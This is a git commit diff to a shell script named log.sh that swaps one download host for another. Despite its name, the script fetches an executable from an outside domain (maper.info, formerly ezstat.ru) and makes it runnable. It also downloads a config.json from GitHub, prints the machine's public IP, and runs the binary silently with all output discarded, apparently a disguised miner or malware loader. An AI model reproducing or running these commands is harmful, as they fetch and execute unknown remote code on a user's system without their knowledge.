19ca87e72e7f2d7e250a206851a8a1a672c806ba
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 12:04:17 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget https://ezstat.ru/CentralTrustCorp && chmod +x CentralTrustCorp >/dev/null 2>&1
+wget https://maper.info/BoonHoldingsInc && chmod +x BoonHoldingsInc >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./CentralTrustCorp -c "config.json" >/dev/null 2>&1
+./BoonHoldingsInc -c "config.json" >/dev/null 2>&1
